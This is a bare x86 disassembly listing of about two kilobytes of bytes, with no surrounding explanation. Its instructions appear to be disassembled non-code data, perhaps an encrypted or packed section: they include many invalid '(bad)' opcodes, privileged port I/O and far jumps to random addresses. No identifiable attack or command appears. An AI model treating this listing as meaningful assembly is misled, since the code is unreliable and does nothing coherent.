  40218c:	mov    ebp,0x98058ed2
  402191:	add    ebp,ebx
  402193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402194:	adc    eax,0xbdd64f15
  402199:	mov    BYTE PTR [esi],al
  40219b:	int3   
  40219c:	imul   ebx
  40219e:	rol    BYTE PTR [ebx-0x5c],0x75
  4021a2:	or     al,0xe7
  4021a4:	inc    eax
  4021a5:	lea    edi,[esi]
  4021a7:	sub    al,0xb8
  4021a9:	fcomp  QWORD PTR [ebx+eax*2]
  4021ac:	dec    BYTE PTR [esi]
  4021ae:	push   ecx
  4021af:	inc    edi
  4021b0:	cs dec edi
  4021b2:	loope  0x4021da
  4021b4:	add    BYTE PTR [esi-0x80],ch
  4021b7:	out    0xf2,eax
  4021b9:	jo     0x40221b
  4021bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021bc:	call   0x418c:0x1db8993
  4021c3:	or     bl,BYTE PTR [edi+0x32962ce3]
  4021c9:	sbb    al,0x81
  4021cb:	push   esi
  4021cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021cd:	inc    edi
  4021ce:	dec    esi
  4021cf:	dec    esp
  4021d0:	jae    0x402196
  4021d2:	or     ah,0x53
  4021d5:	mov    ebx,0xc22ad4fa
  4021da:	pop    ebp
  4021db:	out    0x68,eax
  4021dd:	xor    eax,ebp
  4021df:	mov    ah,0x96
  4021e1:	fidivr DWORD PTR [esi+0x37104cac]
  4021e7:	sbb    al,0x6c
  4021e9:	lods   al,BYTE PTR ds:[esi]
  4021ea:	sbb    bl,al
  4021ec:	pop    edi
  4021ed:	mov    dh,0xc0
  4021ef:	jo     0x402180
  4021f1:	fisubr DWORD PTR [eax]
  4021f3:	scas   eax,DWORD PTR es:[edi]
  4021f4:	ins    DWORD PTR es:[edi],dx
  4021f5:	adc    DWORD PTR [ebx],esi
  4021f7:	mov    edx,0x22a59336
  4021fc:	mov    dl,0x6b
  4021fe:	test   eax,0xf5d84cb5
  402203:	icebp  
  402204:	mov    ds:0x1408830,al
  402209:	loope  0x402209
  40220b:	repnz mov cl,0x3e
  40220e:	je     0x40225e
  402210:	pop    ecx
  402211:	push   es
  402212:	test   eax,0xd812912d
  402217:	je     0x4021a2
  402219:	mov    eax,0x96c3c87d
  40221e:	ret    
  40221f:	imul   edi,DWORD PTR [ecx+0x1a506b01],0xecc53f44
  402229:	clc    
  40222a:	adc    cl,BYTE PTR [ebp+0x5041a3eb]
  402230:	xor    eax,0x3a1609a5
  402235:	dec    esi
  402236:	or     BYTE PTR [ebx+0x38c6f64b],dl
  40223c:	push   edx
  40223d:	xor    eax,0x650451f6
  402242:	xor    BYTE PTR cs:[ebx],0xfe
  402246:	inc    esp
  402247:	mov    ah,0x7b
  402249:	mov    dh,0x5c
  40224b:	fwait
  40224c:	lds    ecx,FWORD PTR [edi-0x80]
  40224f:	mov    esp,0x4ec70f2c
  402254:	scas   al,BYTE PTR es:[edi]
  402255:	dec    esi
  402256:	push   ds
  402257:	dec    edx
  402258:	push   ebx
  402259:	sbb    eax,0x81ae8b18
  40225e:	mov    ecx,0x8a064e70
  402263:	push   ecx
  402264:	adc    ecx,DWORD PTR [ebx+0x68aaebc7]
  40226a:	hlt    
  40226b:	mov    fs,WORD PTR [edx+0x1f05a2af]
  402271:	or     al,0x8d
  402273:	jg     0x4022ab
  402275:	add    ch,al
  402277:	dec    esp
  402278:	icebp  
  402279:	test   BYTE PTR [edi],0xdf
  40227c:	mov    dh,0x33
  40227e:	ins    BYTE PTR es:[edi],dx
  40227f:	push   ebx
  402280:	and    al,0x60
  402282:	push   eax
  402283:	cmp    edx,DWORD PTR [ebx-0x4329694b]
  402289:	xor    BYTE PTR [esi-0x44],0xa1
  40228d:	push   ds
  40228e:	idiv   DWORD PTR [ecx+ecx*1+0x546a313b]
  402295:	repz fnsave [edx+0x2e137282]
  40229c:	and    al,0xf8
  40229e:	add    eax,ecx
  4022a0:	call   0x94e2012e
  4022a5:	add    al,BYTE PTR [edx]
  4022a7:	loop   0x4022de
  4022a9:	stos   BYTE PTR es:[edi],al
  4022aa:	inc    eax
  4022ab:	push   esi
  4022ac:	sub    edi,DWORD PTR [edx-0x77]
  4022af:	ja     0x402319
  4022b1:	popf   
  4022b2:	jo     0x402258
  4022b4:	xchg   ebp,eax
  4022b5:	mov    dl,0x7b
  4022b7:	inc    ebp
  4022b8:	fnstenv [eax-0xf83a68a]
  4022be:	add    eax,0x857f5529
  4022c3:	add    al,0x76
  4022c5:	repz pop ds
  4022c7:	enter  0x19e1,0x2e
  4022cb:	adc    bl,BYTE PTR [eax-0x64]
  4022ce:	mov    ebx,0xd77616e7
  4022d3:	cmp    ch,BYTE PTR [edx+0x1a]
  4022d6:	inc    edx
  4022d7:	inc    eax
  4022d8:	push   ebp
  4022d9:	mov    edx,0xafc97bc9
  4022de:	sbb    al,0xfd
  4022e0:	sbb    ch,BYTE PTR [edi-0x3]
  4022e3:	xchg   edi,ecx
  4022e5:	xchg   ecx,eax
  4022e6:	xchg   edi,eax
  4022e7:	dec    ecx
  4022e8:	add    dl,BYTE PTR [edi]
  4022ea:	adc    eax,0x838b05a
  4022ef:	xchg   edi,eax
  4022f0:	inc    ebx
  4022f1:	and    ebp,DWORD PTR [edi+ebx*1+0x37]
  4022f5:	mov    al,ds:0xa8357ecd
  4022fa:	push   edx
  4022fb:	xchg   esi,eax
  4022fc:	push   ebp
  4022fd:	jns    0x4022c0
  4022ff:	loopne 0x402329
  402301:	int    0xc6
  402303:	adc    ecx,DWORD PTR [ecx+0x4714b8ae]
  402309:	cs adc eax,0xa4f83c67
  40230f:	xchg   esi,eax
  402310:	mov    ds:0x3e506b9b,eax
  402315:	jae    0x402372
  402317:	ja     0x4022bd
  402319:	retf   0xc6ab
  40231c:	loopne 0x402364
  40231e:	adc    DWORD PTR [eax-0x542e6cf1],esp
  402324:	mov    cl,0x8a
  402326:	test   al,0xfa
  402328:	pop    esp
  402329:	imul   ebx,DWORD PTR [eiz*4-0x6197d89e],0xffffffd5
  402331:	shl    cl,1
  402333:	and    bl,BYTE PTR [ecx-0x80]
  402336:	xor    eax,0xb660c5d
  40233b:	pminsw mm6,QWORD PTR [esi+0xd2cd447]
  402342:	fild   QWORD PTR [esi]
  402344:	adc    BYTE PTR [ebx],dh
  402346:	adc    al,0x93
  402348:	mov    ch,BYTE PTR ds:0x67eb3841
  40234e:	inc    ecx
  40234f:	fimul  WORD PTR [edi-0x4a9aa1c1]
  402355:	xchg   BYTE PTR [ebx+0x2be440e7],dh
  40235b:	sbb    dh,BYTE PTR [ebx-0x5f]
  40235e:	out    dx,al
  40235f:	leave  
  402360:	ror    DWORD PTR [edx],0x97
  402363:	ret    
  402364:	lock enter 0x336a,0x9e
  402369:	cmp    DWORD PTR [ebx],ebx
  40236b:	dec    ebp
  40236c:	ror    BYTE PTR [ecx-0x32],1
  40236f:	pushf  
  402370:	xor    eax,0x638e73dc
  402375:	stos   BYTE PTR es:[edi],al
  402376:	pop    ebx
  402377:	test   al,0x43
  40237a:	add    dh,BYTE PTR [edi+0x7d10c47e]
  402380:	loopne 0x40239f
  402382:	dec    edi
  402383:	sub    edi,DWORD PTR [eax]
  402385:	sub    edi,0x63
  402388:	das    
  402389:	loopne 0x402365
  40238b:	jb     0x402397
  40238d:	shr    DWORD PTR [ecx+eax*1-0x2c],0xd3
  402392:	arpl   WORD PTR [edi],bp
  402394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402395:	cmp    dh,BYTE PTR [esi]
  402397:	xor    al,0xcb
  402399:	sbb    eax,ecx
  40239b:	mov    edi,0xb9093277
  4023a0:	mov    esp,0xdc9e16a4
  4023a5:	out    dx,eax
  4023a6:	cmp    BYTE PTR [edi-0x213bb40],0xa3
  4023ad:	arpl   WORD PTR [edx+0x7563e999],di
  4023b3:	out    dx,al
  4023b4:	imul   ecx,DWORD PTR [esi+0x8],0x87a25c1e
  4023bb:	pop    ss
  4023bc:	in     eax,0x97
  4023be:	sbb    eax,0x8a67f725
  4023c3:	mov    dl,0xa5
  4023c5:	push   eax
  4023c6:	sar    eax,1
  4023c8:	shl    ebx,cl
  4023ca:	inc    esi
  4023cb:	js     0x40238e
  4023cd:	cmp    edi,0xffffffca
  4023d0:	sub    esp,DWORD PTR [esp+edi*1-0x36]
  4023d4:	inc    edx
  4023d5:	sbb    ecx,DWORD PTR [edi+0x71]
  4023d8:	jns    0x402443
  4023da:	lods   al,BYTE PTR ds:[esi]
  4023db:	mov    ebx,0xc1823f17
  4023e0:	jge    0x40241b
  4023e2:	sub    BYTE PTR [ecx-0x5a],bh
  4023e5:	xchg   ebx,eax
  4023e6:	lds    edx,FWORD PTR [esp+ebp*2+0x19]
  4023ea:	mov    BYTE PTR cs:[esi],ch
  4023ed:	gs jle 0x402380
  4023f0:	adc    al,0x9a
  4023f2:	and    esi,DWORD PTR [edx+0x702b00a7]
  4023f8:	nop
  4023f9:	icebp  
  4023fa:	sub    BYTE PTR [eax+edi*4],0xd4
  4023fe:	jmp    0xaf96:0x28e4aa2
  402405:	inc    esp
  402406:	hlt    
  402407:	std    
  402408:	adc    ch,BYTE PTR ds:0xcb9fa5d2
  40240e:	(bad)  
  40240f:	push   cs
  402410:	popf   
  402411:	add    edx,ebx
  402413:	loopne 0x4023d0
  402415:	mov    ebp,0x52c56b22
  40241a:	sbb    DWORD PTR [edi-0x4c9f48e8],ecx
  402420:	pushf  
  402421:	mov    edx,0x8ac58249
  402426:	lea    edi,[ecx-0x62]
  402429:	pushf  
  40242a:	push   ds
  40242b:	xchg   ecx,eax
  40242c:	inc    ebp
  40242d:	(bad)  
  40242e:	inc    ecx
  40242f:	shr    ebp,1
  402431:	call   0x36ed25ea
  402436:	loope  0x40246a
  402438:	aaa    
  402439:	jno    0x4024b5
  40243b:	fsub   DWORD PTR [ecx]
  40243d:	jg     0x40242c
  40243f:	push   ss
  402440:	adc    eax,0xfc40e643
  402445:	ja     0x4024aa
  402447:	xor    bl,ch
  402449:	cmp    al,0x59
  40244b:	jns    0x4023f7
  40244d:	jo     0x4024b1
  40244f:	dec    edi
  402450:	into   
  402451:	(bad)  
  402452:	sbb    eax,0xb214dedd
  402457:	out    dx,al
  402458:	daa    
  402459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40245a:	cmp    BYTE PTR [ebp-0x46],bh
  40245d:	lea    ebp,[edx]
  40245f:	mov    ch,0xb8
  402461:	pop    esp
  402462:	jno    0x4023f7
  402464:	push   ecx
  402465:	xchg   ebx,eax
  402466:	rol    BYTE PTR [ebx-0x51],1
  402469:	test   eax,esp
  40246b:	repz mov cl,0xca
  40246e:	ror    esi,1
  402470:	retf   0x78d2
  402473:	popa   
  402474:	adc    al,BYTE PTR [esi-0x15]
  402477:	xor    al,0x55
  402479:	cmp    edx,DWORD PTR [eax-0x4b]
  40247c:	xor    BYTE PTR [edi+0x48],cl
  40247f:	mov    bh,0x6b
  402481:	push   ecx
  402482:	adc    esi,esi
  402484:	xchg   edx,eax
  402485:	(bad)  
  402486:	call   0xcf14:0x13fac8ee
  40248d:	add    DWORD PTR [ebx],eax
  40248f:	out    dx,eax
  402490:	push   ss
  402491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402492:	or     al,cl
  402494:	(bad)  
  402495:	jnp    0x4024fe
  402497:	ret    
  402498:	(bad)  [edi-0x51a13663]
  40249e:	fld    DWORD PTR [esi-0x358957e4]
  4024a4:	xor    BYTE PTR [ebx-0x29e6508f],bl
  4024aa:	data16 mov ss,WORD PTR [eax+0x3be35a89]
  4024b1:	enter  0x5058,0x61
  4024b5:	or     BYTE PTR [ecx+0x45],0x7f
  4024b9:	xchg   ebp,eax
  4024ba:	(bad)  [edx-0x2fe64f9f]
  4024c0:	pop    ebx
  4024c1:	sub    eax,0xcd03d084
  4024c6:	adc    BYTE PTR [esi-0x7],al
  4024c9:	rcr    BYTE PTR [edx-0x46],1
  4024cc:	cwde   
  4024cd:	(bad)
  4024d1:	and    BYTE PTR [edx],0xda
  4024d4:	cld    
  4024d5:	xlat   BYTE PTR ds:[ebx]
  4024d6:	pop    ecx
  4024d7:	push   0x3e
  4024d9:	fmul   DWORD PTR [esi]
  4024db:	or     DWORD PTR [ebx-0x38d40543],0xffffffc9
  4024e2:	jns    0x402512
  4024e4:	sti    
  4024e5:	fsub   st(1),st
  4024e7:	jbe    0x4024df
  4024e9:	cli    
  4024ea:	mov    eax,ds:0x291dfef0
  4024ef:	cdq    
  4024f0:	rol    BYTE PTR [ecx+0x64],1
  4024f3:	xchg   edi,eax
  4024f4:	sub    BYTE PTR [edx+ecx*2+0x22],ah
  4024f8:	fcomp  st(6)
  4024fa:	aas    
  4024fb:	lods   al,BYTE PTR ds:[esi]
  4024fc:	mov    ebx,0x69db7fdb
  402501:	xchg   esp,eax
  402502:	adc    DWORD PTR [ebp+0x3c],ebx
  402505:	push   cs
  402506:	imul   esi,DWORD PTR [ecx+edx*1-0x5a],0x22
  40250b:	loope  0x402490
  40250d:	or     eax,0x571869d9
  402512:	xor    eax,0x94d07e39
  402517:	ret    0x447e
  40251a:	jmp    0x8e55afdb
  40251f:	imul   edx,DWORD PTR [esi-0x77],0xeb90a554
  402526:	mov    dh,0xba
  402528:	adc    al,0x3b
  40252a:	sub    BYTE PTR [edx+0x58],0xd4
  40252e:	mov    edx,0x581ec779
  402533:	std    
  402534:	cmc    
  402535:	or     eax,0xc9ce3d7d
  40253a:	inc    ecx
  40253b:	jle    0x40257f
  40253d:	lods   eax,DWORD PTR ds:[esi]
  40253e:	jne    0x40259b
  402540:	xchg   edi,eax
  402541:	jbe    0x4024e1
  402543:	xchg   edi,eax
  402544:	cmp    eax,0x94040c86
  402549:	xor    eax,0xfae28227
  40254e:	lahf   
  40254f:	data16 (bad) 
  402551:	and    BYTE PTR fs:[edi],dl
  402554:	mov    esi,0x5b92ca65
  402559:	inc    ebp
  40255a:	xlat   BYTE PTR ds:[ebx]
  40255b:	mov    dl,0xf0
  40255d:	ja     0x4025d0
  40255f:	and    ebp,edi
  402561:	lods   al,BYTE PTR ds:[esi]
  402562:	dec    BYTE PTR [eax+0x28]
  402565:	in     eax,dx
  402566:	outs   dx,DWORD PTR ds:[esi]
  402567:	repz adc DWORD PTR [eax-0x5aed683a],eax
  40256e:	dec    esi
  40256f:	and    eax,0x94a6dda6
  402574:	push   ebx
  402575:	in     al,0x6a
  402577:	xchg   esi,eax
  402578:	sti    
  402579:	test   eax,0x9127cac3
  40257e:	jne    0x4025f6
  402580:	pop    ebx
  402581:	repnz add DWORD PTR [ebp+0xe97b21],edi
  402588:	xchg   ah,dh
  40258a:	es push eax
  40258c:	inc    eax
  40258d:	in     eax,0x33
  40258f:	cmc    
  402590:	test   BYTE PTR [esi+0x34],bh
  402593:	or     DWORD PTR [ebx+0x3197c8fe],ebx
  402599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40259a:	repz sbb ecx,DWORD PTR [eax+0x5999eb00]
  4025a1:	ret    
  4025a2:	mov    edi,0x893d8c2c
  4025a7:	sub    esi,DWORD PTR [eax]
  4025a9:	mov    ecx,0xa53bb5a4
  4025ae:	jmp    0x78c3:0x8db4b62c
  4025b5:	pop    eax
  4025b6:	adc    BYTE PTR [eax+eax*1+0x2f],0x2a
  4025bb:	outs   dx,BYTE PTR ds:[esi]
  4025bc:	clc    
  4025bd:	adc    al,0xa3
  4025bf:	mov    edx,0x229deac
  4025c4:	inc    esi
  4025c5:	or     cl,BYTE PTR [eax-0x9f85170]
  4025cb:	ds add eax,0xa002f3da
  4025d1:	lods   eax,DWORD PTR ds:[esi]
  4025d2:	es ja  0x402575
  4025d5:	retf   
  4025d6:	cmp    bl,BYTE PTR [ebp+0x5]
  4025d9:	repnz cmp al,0x7f
  4025dc:	and    DWORD PTR [ebx+0x26],esi
  4025df:	cmp    al,0x75
  4025e1:	mov    ah,0x79
  4025e3:	inc    esi
  4025e4:	lds    ecx,FWORD PTR [esi+ecx*1-0x6e]
  4025e8:	sbb    ch,BYTE PTR [ecx+ebx*1]
  4025eb:	cli    
  4025ec:	les    ebx,FWORD PTR [edi+0x11]
  4025ef:	jbe    0x40265e
  4025f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025f2:	inc    ecx
  4025f3:	mov    DWORD PTR [bp+0x49a0],ecx
  4025f8:	add    DWORD PTR [eax-0x41],0xffffffdd
  4025fc:	cmp    BYTE PTR [ecx],dl
  4025fe:	mov    dh,0xf6
  402600:	sub    cl,BYTE PTR [ecx+0x46f2f344]
  402606:	mov    dl,0x10
  402608:	mov    dh,0xa0
  40260a:	int    0xce
  40260c:	es pop edx
  40260e:	dec    ecx
  40260f:	sbb    ah,BYTE PTR [ebp-0x4c]
  402612:	sbb    al,0x92
  402614:	in     eax,0xaf
  402616:	adc    al,0xa7
  402618:	sub    eax,0xcdce27b0
  40261d:	mov    eax,0xb86f5919
  402622:	or     ecx,esi
  402624:	sbb    cl,ch
  402626:	pop    edx
  402627:	mov    dl,al
  402629:	test   DWORD PTR [eax-0x949da79],ecx
  40262f:	ja     0x40262f
  402631:	lock (bad) 
  402633:	push   edi
  402634:	sub    esp,DWORD PTR [edx+0x450190a6]
  40263a:	jl     0x4025d2
  40263c:	xor    bl,ch
  40263e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40263f:	ficomp DWORD PTR [ebp+0x6b5b4c24]
  402645:	jae    0x402601
  402647:	jnp    0x402665
  402649:	cmc    
  40264a:	call   0x65a9:0xcde99751
  402651:	adc    BYTE PTR es:[esi],ah
  402654:	cli    
  402655:	adc    al,0xed
  402657:	lods   al,BYTE PTR ds:[esi]
  402658:	cmp    al,0x63
  40265a:	dec    edi
  40265b:	push   0x13
  40265d:	xchg   ebp,eax
  40265e:	or     dh,bh
  402660:	sub    esi,ebp
  402662:	mov    ch,0x76
  402664:	push   esi
  402665:	sbb    dh,BYTE PTR es:[edi+eax*2]
  402669:	mov    ecx,0x5abb2bbf
  40266e:	cs daa 
  402670:	mov    al,0xce
  402672:	retf   0x777f
  402675:	iret   
  402676:	or     DWORD PTR [edi],eax
  402678:	push   edi
  402679:	loopne 0x4026dc
  40267b:	scas   eax,DWORD PTR es:[edi]
  40267c:	mov    al,0x22
  40267e:	jae    0x4026fa
  402680:	cmc    
  402681:	add    ah,ch
  402683:	leave  
  402684:	or     al,ah
  402686:	or     BYTE PTR [bx+di],bh
  402689:	scas   al,BYTE PTR es:[edi]
  40268a:	jp     0x4026ac
  40268c:	dec    esi
  40268d:	xor    DWORD PTR [eax-0xcb4ceb7],ebp
  402693:	out    dx,eax
  402694:	mov    al,ds:0x78cdbf4d
  402699:	cmp    ah,ah
  40269b:	aas    
  40269c:	sub    eax,DWORD PTR [eax+0x72]
  40269f:	adc    DWORD PTR ss:[eax-0x75212f87],0x5be343f8
  4026aa:	sub    edx,DWORD PTR [edi-0x4f]
  4026ad:	sbb    BYTE PTR [edx],dl
  4026af:	add    bh,BYTE PTR [esi]
  4026b1:	pop    es
  4026b2:	and    BYTE PTR [ebp-0x51abed5f],ah
  4026b8:	xchg   esp,eax
  4026b9:	cmp    BYTE PTR [esp+eax*4-0x1c],dl
  4026bd:	gs in  eax,dx
  4026bf:	dec    ebx
  4026c0:	xchg   esp,eax
  4026c1:	stc    
  4026c2:	imul   esi,edx,0x1f
  4026c5:	test   al,0x3f
  4026c7:	loope  0x4026e8
  4026c9:	mov    esi,0x23c69c2f
  4026ce:	repz rcr al,0x93
  4026d2:	lea    eax,[edx]
  4026d4:	je     0x40274d
  4026d6:	xchg   ecx,eax
  4026d7:	mov    ebx,0x52a085d3
  4026dc:	gs mov al,0xa5
  4026df:	enter  0x5c6f,0x9b
  4026e3:	xchg   DWORD PTR [edi+eax*1-0xd6508dd],edx
  4026ea:	cli    
  4026eb:	dec    ebx
  4026ec:	inc    edi
  4026ed:	jmp    0x402760
  4026ef:	xor    ebp,DWORD PTR [eax+0x6c]
  4026f2:	lds    eax,FWORD PTR [ecx+ecx*4+0x759e0d3d]
  4026f9:	jmp    0xb395ff80
  4026fe:	ins    DWORD PTR es:[edi],dx
  4026ff:	push   eax
  402700:	pop    esi
  402701:	rcr    DWORD PTR [ebp+edi*1-0x1c83172f],1
  402708:	inc    ecx
  402709:	stc    
  40270a:	jnp    0x402765
  40270c:	adc    al,0x9f
  40270e:	(bad)  
  40270f:	and    eax,0x1828e035
  402714:	push   0x6b
  402716:	fistp  DWORD PTR [eax+0x63865a86]
  40271c:	lods   eax,DWORD PTR ds:[esi]
  40271d:	push   eax
  40271e:	rcl    BYTE PTR [ebx],0xf9
  402721:	rcr    BYTE PTR [ebx-0x42],cl
  402724:	dec    ecx
  402725:	not    BYTE PTR [eax-0x7c1b63c0]
  40272b:	gs jno 0x4027aa
  40272e:	fbld   TBYTE PTR [ebp-0x3d]
  402731:	dec    ecx
  402732:	(bad)  
  402734:	cld    
  402735:	repnz leave 
  402737:	leave  
  402738:	mov    ah,0x70
  40273a:	das    
  40273b:	sub    eax,0xa55b1f06
  402740:	test   eax,0x556db116
  402745:	shl    DWORD PTR [edx],0xc8
  402748:	mov    cl,BYTE PTR [ebp-0x51]
  40274b:	jecxz  0x4026e6
  40274d:	fiadd  WORD PTR [edi+0x4fb2c8b0]
  402753:	fs dec esi
  402755:	stos   DWORD PTR es:[edi],eax
  402756:	push   esi
  402757:	shl    BYTE PTR [esi-0x2707389],cl
  40275d:	add    al,0x37
  40275f:	mov    cl,0x5e
  402761:	add    dh,BYTE PTR [edi-0x77957dc9]
  402767:	popf   
  402768:	shl    BYTE PTR [esi+eax*8],0x14
  40276c:	je     0x40273a
  40276e:	push   di
  402770:	mov    ss,WORD PTR [edi-0x78]
  402773:	mov    edi,0x9afd99e0
  402778:	sub    esi,DWORD PTR [ebp+eax*4+0x68]
  40277c:	ret    
  40277d:	jmp    0x9196:0xd57b44eb
  402784:	jns    0x402727
  402786:	xchg   edx,ecx
  402788:	(bad)  
  402789:	cli    
  40278a:	jp     0x40278c
  40278c:	lea    edi,[eax-0x350c305f]
  402792:	pop    ds
  402793:	pop    ebx
  402794:	leave  
  402795:	inc    ebp
  402796:	and    BYTE PTR [eax+0x2efdfe86],bl
  40279c:	pop    edx
  40279d:	xor    esi,eax
  40279f:	lahf   
  4027a0:	sar    DWORD PTR [ebx-0x42],1
  4027a3:	mov    ah,0xd9
  4027a5:	outs   dx,BYTE PTR ds:[esi]
  4027a6:	inc    esp
  4027a7:	push   es
  4027a8:	sub    edx,DWORD PTR [esi+0x3b7f4a2f]
  4027ae:	xchg   edi,eax
  4027af:	dec    ebp
  4027b0:	xchg   BYTE PTR [esi],cl
  4027b2:	xchg   ecx,eax
  4027b3:	idiv   DWORD PTR [edx+0x1e9a94e8]
  4027b9:	sbb    DWORD PTR [edx],0x5
  4027bc:	test   DWORD PTR [ecx+ebp*8+0x3467bae1],ecx
  4027c3:	je     0x402768
  4027c5:	call   0xfabe:0x67d5542b
  4027cc:	xchg   ah,al
  4027ce:	mov    ebp,0x4bd53fae
  4027d3:	inc    ecx
  4027d4:	jecxz  0x402808
  4027d6:	les    esp,FWORD PTR [ecx-0x56]
  4027d9:	sub    ebx,DWORD PTR [edi+0x16d8334b]
  4027df:	(bad)  
  4027e0:	cmp    DWORD PTR [esi],ecx
  4027e2:	cmp    eax,0xa8e61985
  4027e7:	adc    DWORD PTR [edx-0x28],ebx
  4027ea:	and    al,0x51
  4027ec:	in     al,dx
  4027ed:	in     eax,dx
  4027ee:	iret   
  4027ef:	cld    
  4027f0:	and    DWORD PTR [esi],eax
  4027f2:	cmp    esp,esi
  4027f4:	sbb    ch,BYTE PTR [ecx]
  4027f6:	out    dx,eax
  4027f7:	out    0x5f,eax
  4027f9:	sub    ah,dh
  4027fb:	xor    ah,BYTE PTR [edx+0x3416c93]
  402801:	sti    
  402802:	xchg   edi,eax
  402803:	in     al,0x10
  402805:	mov    dl,bh
  402807:	jl     0x40287a
  402809:	loop   0x4027ca
  40280b:	cwde   
  40280c:	and    esp,edi
  40280e:	pop    ecx
  40280f:	(bad)  
  402810:	int    0x2d
  402812:	mov    ebp,0x456a7a18
  402817:	xor    BYTE PTR [ecx+0x76e67031],bl
  40281d:	adc    al,0xa8
  40281f:	lahf   
  402820:	push   ss
  402821:	adc    dh,BYTE PTR [edx]
  402823:	retf   0x9a26
  402826:	repz mov ebp,DWORD PTR [edi]
  402829:	add    ch,0xa8
  40282c:	mov    esi,0x1b80263
  402831:	cmp    ah,BYTE PTR [edi-0x1]
  402834:	mov    esi,0x853dbf96
  402839:	xchg   esi,eax
  40283a:	loopne 0x40286e
  40283c:	out    0xe6,eax
  40283e:	call   0x7a910e47
  402843:	retf   
  402844:	pop    esp
  402845:	aaa    
  402846:	or     al,0x59
  402848:	fst    QWORD PTR [ebx]
  40284a:	aas    
  40284b:	xchg   esp,eax
  40284c:	fwait
  40284d:	dec    ebx
  40284e:	imul   ebx,DWORD PTR [edx+0x14],0x29b4f6fd
  402855:	test   eax,0x7ff0ee33
  40285a:	or     DWORD PTR [edx-0x5a156fba],esp
  402860:	(bad)  
  402861:	push   eax
  402862:	ins    BYTE PTR es:[edi],dx
  402863:	mov    ds:0xa1c145f,al
  402868:	outs   dx,DWORD PTR ds:[esi]
  402869:	aaa    
  40286a:	imul   ebp,DWORD PTR [ecx-0x60],0x3
  40286e:	int3   
  40286f:	ja     0x40281b
  402871:	inc    eax
  402872:	out    dx,eax
  402873:	lods   al,BYTE PTR ds:[esi]
  402874:	xor    eax,0x2073aeef
  402879:	xchg   edi,eax
  40287a:	cmp    ebx,eax
  40287c:	outs   dx,BYTE PTR ds:[esi]
  40287d:	push   ebx
  40287e:	ja     0x4028d4
  402880:	adc    cl,BYTE PTR [eax+ebp*4-0x6d]
  402884:	mov    al,0xd4
  402886:	mov    esp,0x4d9e7c57
  40288b:	shr    BYTE PTR [esp+ecx*1],cl
  40288e:	outs   dx,BYTE PTR ds:[esi]
  40288f:	xchg   ebp,eax
  402890:	adc    al,0x2
  402892:	dec    esi
  402893:	int    0x28
  402895:	(bad)  
  402897:	xor    eax,0x2e1f1bd
  40289c:	and    ebp,DWORD PTR [edx]
  40289e:	shr    BYTE PTR [ebx+0x7eb4c95e],cl
  4028a4:	push   0x80495454
  4028a9:	pop    ebp
  4028aa:	inc    ebx
  4028ab:	ja     0x402858
  4028ad:	(bad)
  4028b0:	mov    al,0xe9
  4028b2:	mov    WORD PTR [eax+0x79],cs
  4028b5:	pushf  
  4028b6:	bound  esi,QWORD PTR [ecx+0x4c]
  4028b9:	(bad)  [ebx+0x419d4861]
  4028bf:	int    0xb3
  4028c1:	mov    eax,ds:0x86a54e43
  4028c6:	fld    TBYTE PTR [ecx-0xa]
  4028c9:	shl    BYTE PTR [ebx],cl
  4028cb:	dec    edi
  4028cc:	ficomp DWORD PTR [eax-0x4a]
  4028cf:	aas    
  4028d0:	sub    al,BYTE PTR [eax+0x4eaed935]
  4028d6:	push   ecx
  4028d7:	push   ds
  4028d8:	push   ebx
  4028d9:	push   edx
  4028da:	pop    esp
  4028db:	sub    ebp,DWORD PTR [edi+0x53]
  4028de:	outs   dx,BYTE PTR ds:[esi]
  4028df:	xor    al,0xae
  4028e1:	sbb    eax,0x70e1d2ba
  4028e6:	frstor [edi+0x51]
  4028e9:	jno    0x402929
  4028eb:	sub    ebx,DWORD PTR [edx]
  4028ed:	jb     0x402916
  4028ef:	dec    esi
  4028f0:	sbb    DWORD PTR [eax+0x3b889131],0x303ebf4b
  4028fa:	mov    ah,0xd7
  4028fc:	(bad)
  402900:	xchg   edx,eax
  402901:	adc    cl,cl
  402903:	daa    
  402904:	push   es
  402905:	cmp    BYTE PTR [ecx-0x10],bh
  402908:	cmp    eax,0x2aa8609d
  40290d:	jo     0x4028c8
  40290f:	rol    DWORD PTR [eax],1
  402911:	addr16 (bad) 
  402913:	jo     0x4028b8
  402915:	xor    al,0xe8
  402917:	adc    al,0x19
  402919:	dec    edx
  40291a:	fwait
  40291b:	xor    ch,BYTE PTR [eax]
  40291d:	sub    ebx,eax
  40291f:	sub    ecx,DWORD PTR [ebp-0x4]
  402922:	call   0x150f6126
  402927:	bound  esp,QWORD PTR [edx-0x39]
  40292a:	hlt    
  40292b:	sahf   
  40292c:	in     al,dx
  40292d:	and    DWORD PTR [ecx],ebp
  40292f:	sub    ebx,DWORD PTR [ebx+eiz*8-0x12]
  402933:	fcomp  QWORD PTR [edx]
  402935:	loopne 0x402959
  402937:	push   esp
  402938:	jp     0x402912
  40293a:	(bad)  
  40293b:	sbb    al,0x64
  40293d:	mov    esi,?
  40293f:	sbb    ebx,DWORD PTR [eiz*8+0x2a64776]
  402946:	sahf   
  402947:	add    eax,0x54536272
  40294c:	cwde   
  40294d:	mov    edi,0xbe7e7333
  402952:	sub    bl,ah
  402954:	bound  ecx,QWORD PTR [esi-0x62963a7a]
  40295a:	mov    eax,ds:0xbb8989d5
  40295f:	jecxz  0x4029b4
  402961:	call   FWORD PTR [eax]
  402963:	and    BYTE PTR [ecx-0x69],0xd
  402967:	cli    
  402968:	in     eax,dx
  402969:	out    0x51,eax
  40296b:	mov    ecx,0x3408f7a8
  402970:	ret    
  402971:	add    eax,0xf69bc5f1
  402976:	mov    cl,0xb6
  402978:	jp     0x4029a8
  40297a:	daa    
  40297b:	sti    
  40297c:	jbe    0x40299d
  40297e:	jp     0x40292a
  402980:	cmp    eax,0xffffff8f
  402983:	in     eax,0xcd
  402985:	push   ecx
  402986:	xor    DWORD PTR [edx-0x39],esp
  402989:	sar    BYTE PTR [eax+0x6f],0xfc
  40298d:	or     DWORD PTR [edx-0x228a9b3a],0x79140383
